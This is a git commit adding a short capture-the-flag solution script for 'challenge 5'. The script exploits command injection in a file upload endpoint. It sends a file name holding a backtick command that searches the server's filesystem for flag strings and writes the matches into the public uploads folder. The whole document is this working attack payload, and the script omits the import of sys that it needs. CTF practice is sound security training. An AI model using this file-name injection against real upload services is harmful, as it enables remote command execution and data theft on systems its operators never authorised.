3f3b77788e5d649913db3624acc5fda056854537
arvid-persson1 <a.persson04@gmail.com>
2025-10-07 15:42:31 +0200

    challenge 5 complete

---
+++ chal5/main.py
@@ -0,0 +1,10 @@
+from requests import post
+
+url_index, img_path = sys.argv[1:3]
+url_upload = f"{url_index}/upload"
+
+sys_dirs = ("bin", "dev", "lib64", "opt", "root", "sbin", "sys", "usr", "boot", "etc", "lib", "mnt", "proc", "run", "srv", "tmp", "var")
+exclude = "".join(f"--exclude-dir={dir}" for dir in sys_dirs)
+injection = f"""`grep -rsiPo "flag{{\K.*?(?=}})" / {exclude} > uploads/flag.txt`.png"""
+
+post(url_upload, files={"file": (injection, open("/dev/null"))})
